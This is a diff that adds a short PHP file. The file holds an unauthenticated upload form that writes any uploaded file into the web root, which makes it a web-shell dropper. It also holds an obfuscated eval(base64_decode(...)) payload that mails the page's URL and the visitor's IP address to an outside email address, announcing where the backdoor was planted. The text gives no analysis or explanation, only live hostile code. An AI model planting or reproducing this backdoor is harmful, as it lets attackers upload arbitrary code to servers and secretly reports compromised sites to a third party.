@@ -1,0 +1,17 @@
+<?php
+error_reporting(0);
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['file']['name'];
+$saw2 = $root.'/'.$files;
+$saw1 = $_FILES['file']['tmp_name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+<input type='file'name='file' />
+<input type='submit' value='up' />
+</form>";
+@copy($saw1,$saw2);
+$web = "http://".$_SERVER['HTTP_HOST']."/";
+echo "<br><yourfile>$web$files</yourfile>";
+?>
+<?php
+eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
+?>
